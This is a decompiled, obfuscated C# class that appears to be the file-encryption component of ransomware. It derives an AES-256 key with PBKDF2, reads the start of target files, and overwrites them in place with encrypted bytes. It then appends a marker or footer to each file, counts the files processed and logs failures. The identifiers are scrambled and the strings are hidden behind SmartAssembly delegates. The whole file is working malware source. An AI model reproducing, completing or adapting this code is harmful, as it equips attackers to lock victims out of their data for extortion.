using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

public static class jhwgYCEJrwAyHhOqV
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] rvzzzwdOzrGU(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = NSfILrRBRrdvdq(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes NSfILrRBRrdvdq(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] rylMDCeIQdlN(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (fQUgTOUpJumL.kcgyNtrPsiyuwV == getString_0(107396976))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (fQUgTOUpJumL.hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(fQUgTOUpJumL.LImNkSPhwOOQHW, getString_0(107386909) + string_0 + getString_0(107408714) + ex.Message + getString_0(107395924));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool POBdXBMelNFVnn(string tCxABdmTRJNTj, byte[] aDuOpKdbopnXZSS, byte[] jVlQEpTxuNU = null)
	{
		try
		{
			byte[] array = null;
			if (fQUgTOUpJumL.kcgyNtrPsiyuwV == getString_0(107396976))
			{
				array = (fQUgTOUpJumL.MFCrMNyVwftIF ? Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(fQUgTOUpJumL.PvAuHyHwFZ) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408643)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408643))) : (fQUgTOUpJumL.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408624)) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633))) : Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(fQUgTOUpJumL.PvAuHyHwFZ) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(tCxABdmTRJNTj, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(aDuOpKdbopnXZSS, 0, aDuOpKdbopnXZSS.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(tCxABdmTRJNTj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!fQUgTOUpJumL.MFCrMNyVwftIF)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(jVlQEpTxuNU, 0, jVlQEpTxuNU.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (fQUgTOUpJumL.MFCrMNyVwftIF ? Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(fQUgTOUpJumL.PvAuHyHwFZ) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408643)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408643))) : (fQUgTOUpJumL.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408624)) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633))) : Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(fQUgTOUpJumL.PvAuHyHwFZ) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)))));
				FileStream fileStream2 = new FileStream(tCxABdmTRJNTj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(aDuOpKdbopnXZSS, 0, aDuOpKdbopnXZSS.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(tCxABdmTRJNTj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!fQUgTOUpJumL.MFCrMNyVwftIF)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(jVlQEpTxuNU, 0, jVlQEpTxuNU.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			fQUgTOUpJumL.DnHtYVwZFeaR++;
		}
		catch (Exception ex)
		{
			if (fQUgTOUpJumL.hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(fQUgTOUpJumL.LImNkSPhwOOQHW, getString_0(107386909) + tCxABdmTRJNTj + getString_0(107409114) + ex.Message + getString_0(107395924));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array = null;
				array = (fQUgTOUpJumL.MFCrMNyVwftIF ? Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(fQUgTOUpJumL.PvAuHyHwFZ) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408643)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408643))) : (fQUgTOUpJumL.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408624)) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633))) : Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(fQUgTOUpJumL.PvAuHyHwFZ) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)) + Convert.ToString(fQUgTOUpJumL.ybUSgcGwjKebC) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408633)))));
				FileStream fileStream2 = new FileStream(tCxABdmTRJNTj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(aDuOpKdbopnXZSS, 0, aDuOpKdbopnXZSS.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(tCxABdmTRJNTj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!fQUgTOUpJumL.MFCrMNyVwftIF)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(jVlQEpTxuNU, 0, jVlQEpTxuNU.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static jhwgYCEJrwAyHhOqV()
	{
		Strings.CreateGetStringDelegate(typeof(jhwgYCEJrwAyHhOqV));
	}
}
